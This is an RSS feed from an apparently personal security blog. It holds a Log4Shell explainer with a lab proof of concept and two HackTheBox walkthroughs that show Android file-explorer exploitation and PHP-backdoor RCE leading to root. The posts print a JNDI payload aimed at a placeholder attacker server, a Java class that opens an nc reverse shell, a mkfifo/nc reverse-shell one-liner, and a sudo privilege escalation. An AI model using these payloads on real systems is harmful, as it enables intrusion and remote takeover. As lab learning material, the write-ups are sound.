<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Somesh&#39;s Blog</title>
    <link>https://somesh-banerjee.github.io/blogs/</link>
    <description>Recent content on Somesh&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 14 Jan 2022 17:25:22 +0530</lastBuildDate><atom:link href="https://somesh-banerjee.github.io/blogs/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Log4shell</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/log4shell/</link>
      <pubDate>Fri, 14 Jan 2022 17:25:22 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
      <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
logging.WARN(&amp;quot;warning&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.&lt;/li&gt;
&lt;li&gt;The first ATTACKER-SERVER then points to another attacker controlled server which is hosting a malicious Java code.&lt;/li&gt;
&lt;li&gt;The victim requests the malicious code and executes it, leading to RCE.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The process can be visualized with the following figure by &lt;a href=&#34;https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/&#34;&gt;GovCERT&lt;/a&gt;
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list &lt;a href=&#34;https://github.com/YfryTchsGD/Log4jAttackSurface&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h1&gt;
&lt;p&gt;We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.&lt;/p&gt;
&lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
The code just sends a reverse shell to the attacker.&lt;/p&gt;
&lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The CVE have been patched in log4j update by disabling jndi by default. &lt;a href=&#34;https://log4shell.huntress.com/&#34;&gt;HuntresLabs scanner&lt;/a&gt; can be used to check for Log4Shell vulnerability in your app.&lt;/p&gt;
&lt;p&gt;Some of the resources I used to learn about this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&#34;&gt;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&#34;&gt;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;TryHackMe - Solar, exploiting log4j Room&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Explore Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/explore/</link>
      <pubDate>Fri, 15 Oct 2021 13:26:55 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/explore/</guid>
      <description>OS: Android
Points: 20
Difficulty: Easy
ip = 10.10.10.247
nmap scan PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 4501/tcp closed unknown 5555/tcp filtered freeciv 7135/tcp closed unknown 8705/tcp closed unknown 17330/tcp closed unknown 17338/tcp closed unknown 20873/tcp closed unknown 25959/tcp closed unknown 32381/tcp closed unknown 33431/tcp closed unknown 36745/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
      <content>&lt;p&gt;OS: Android&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip = 10.10.10.247&lt;/p&gt;
&lt;h4 id=&#34;nmap-scan&#34;&gt;nmap scan&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
4501/tcp  closed   unknown
5555/tcp  filtered freeciv
7135/tcp  closed   unknown
8705/tcp  closed   unknown
17330/tcp closed   unknown
17338/tcp closed   unknown
20873/tcp closed   unknown
25959/tcp closed   unknown
32381/tcp closed   unknown
33431/tcp closed   unknown
36745/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????&amp;lt;=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
37712/tcp closed   unknown
38224/tcp closed   unknown
40415/tcp closed   unknown
42844/tcp closed   unknown
49627/tcp closed   unknown
51958/tcp closed   unknown
52854/tcp closed   unknown
55744/tcp closed   unknown
56823/tcp closed   unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&#39;t have a title (text/plain).
60540/tcp closed   unknown
60600/tcp closed   unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,&amp;quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20&amp;quot;)%r(GetRequest,5C,&amp;quot;HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;quot;)%r(HTTPOptions,B5,&amp;quot;HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS&amp;quot;)%r(RTSPRequest,BB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0&amp;quot;)%r(Help,AE,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;quot;)%r(SSLSessionReq
SF:,DD,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;quot;)%r(TerminalSe
SF:rverCookie,CA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap&amp;quot;)%r(TLSSessionReq,DB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
&lt;p&gt;There is a http server running on port &lt;code&gt;57999&lt;/code&gt;. Opening the page &lt;code&gt;http://10.10.10.247:59777/&lt;/code&gt; on browser
gives the output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FORBIDDEN: No directory listing.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using gobuster I tried to find other directories.&lt;code&gt;gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir&lt;/code&gt;, output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
/bin                  (Status: 301) [Size: 63] [--&amp;gt; /bin/]
/cache                (Status: 301) [Size: 67] [--&amp;gt; /cache/]
/config               (Status: 301) [Size: 69] [--&amp;gt; /config/]
/d                    (Status: 301) [Size: 59] [--&amp;gt; /d/]
/data                 (Status: 301) [Size: 65] [--&amp;gt; /data/]
/dev                  (Status: 301) [Size: 63] [--&amp;gt; /dev/]
/etc                  (Status: 301) [Size: 63] [--&amp;gt; /etc/]
/init                 (Status: 403) [Size: 31]
/lib                  (Status: 301) [Size: 63] [--&amp;gt; /lib/]
/mnt                  (Status: 301) [Size: 63] [--&amp;gt; /mnt/]
/oem                  (Status: 301) [Size: 63] [--&amp;gt; /oem/]
/proc                 (Status: 301) [Size: 65] [--&amp;gt; /proc/]
/product              (Status: 301) [Size: 71] [--&amp;gt; /product/]
/sbin                 (Status: 301) [Size: 65] [--&amp;gt; /sbin/]
/storage              (Status: 301) [Size: 71] [--&amp;gt; /storage/]
/sys                  (Status: 301) [Size: 63] [--&amp;gt; /sys/]
/system               (Status: 301) [Size: 69] [--&amp;gt; /system/]
/vendor               (Status: 301) [Size: 69] [--&amp;gt; /vendor/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all directories listing is forbidden. I tried to get any credentials. But &lt;code&gt;/etc/ssh&lt;/code&gt; and  &lt;code&gt;/etc/passwd&lt;/code&gt; are not available. For &lt;code&gt;/init&lt;/code&gt; the reading of the file was forbidden. &lt;code&gt;/etc/hosts&lt;/code&gt; was available and while going to that file &lt;code&gt;http://10.10.10.247:59777/etc/hosts&lt;/code&gt;, it was getting downloaded.&lt;/p&gt;
&lt;p&gt;So there are files in the machine and some which are readible to us. We have to &lt;strong&gt;explore files&lt;/strong&gt; in the machine. Searching for &amp;ldquo;explore file android exploits&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to &lt;code&gt;59777&lt;/code&gt;. Lets see exploits help&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help
USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]

┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
[-] WRONG COMMAND!
Available commands :
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
Using &lt;code&gt;listPics&lt;/code&gt; I get a image of credentials.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)


┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The image contains:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kristi
Kr1sT!5h@Rp3xPl0r3!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the credentials for ssh. Connecting through ssh&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;ssh kristi@10.10.10.247 -p 2222          
The authenticity of host &#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&#39; can&#39;t be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;[10.10.10.247]:2222&#39; (RSA) to the list of known hosts.
Password authentication
Password:
:/ $ ls
acct                   init.superuser.rc       sbin
bin                    init.usb.configfs.rc    sdcard
bugreports             init.usb.rc             sepolicy
cache                  init.zygote32.rc        storage
charger                init.zygote64_32.rc     sys
config                 lib                     system
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc
default.prop           oem                     vendor
dev                    plat_file_contexts      vendor_file_contexts
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
init                   plat_seapp_contexts     vendor_seapp_contexts
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
init.environ.rc        proc                    vndservice_contexts
init.rc                product
:/ $ whoami
u0_a76
:/ $ cd s
sbin/     sdcard/   sepolicy  storage/  sys/      system/
:/ $ cd sdcard/
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/sdcard $ ca
cal             cameraserver    case            cat             catv
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title>Knife Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/knife/</link>
      <pubDate>Sun, 29 Aug 2021 13:26:11 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/knife/</guid>
      <description>OS: Linux
Points: 20
Difficulty: Easy
ip=10.10.10.242
User solution The first thing is to do the nmap scan.
┌──(kali㉿kali)-[~/HTB/Knife] └─$ ip=10.10.10.242 ┌──(kali㉿kali)-[~/HTB/Knife] └─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) ┌──(kali㉿kali)-[~/HTB/Knife] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT Nmap scan report for 10.10.10.242 Host is up (0.</description>
      <content>&lt;p&gt;OS: Linux&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip=10.10.10.242&lt;/p&gt;
&lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
&lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ip=10.10.10.242

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
Nmap scan report for 10.10.10.242
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now lets look at website at port 80.&lt;br&gt;
From the nmap scan we know that the server uses Apache 2.4.41 and Ubuntu OS. Using Wappalyzer we found it also uses PHP 8.1.0.\&lt;/p&gt;
&lt;p&gt;There is a RCE exploit for PHP 8.1.0. Download it from &lt;a href=&#34;https://www.exploit-db.com/exploits/49933&#34;&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Run the exploit and got the flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ python3 exploits/49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can&#39;t acces tty; job crontol turned off.
$ whoami
james

$ pwd
/

$ cd /home/james; ls; cat user*
authorized_keys
hello
hello.rb
user.txt
aec6c92f2b998dc3912f334ac0c69ed5
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
&lt;p&gt;Before procedding lets get a reverse shell at port 5454 with &lt;code&gt;mkfifo /tmp/f; nc &amp;lt;local-ip&amp;gt; 5454 &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;amp;1; rm /tmp/f&lt;/code&gt; and run &lt;code&gt;nc -lvnp 5454&lt;/code&gt; before running the command.&lt;/p&gt;
&lt;p&gt;I was unable to do the root part while the machine was active. Later from a help I realized I forgot to check GTFObins.&lt;/p&gt;
&lt;p&gt;Coming to the process first we have to see which executables we can run as sudo.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Search GTFObins for knife you will get a command for shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo knife exec -E &#39;exec &amp;quot;/bin/sh&amp;quot;&#39;
# whoami
root
# cat root/root.txt
b1c946e0dcc0715cb9039799fe824278
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
  </channel>
</rss>
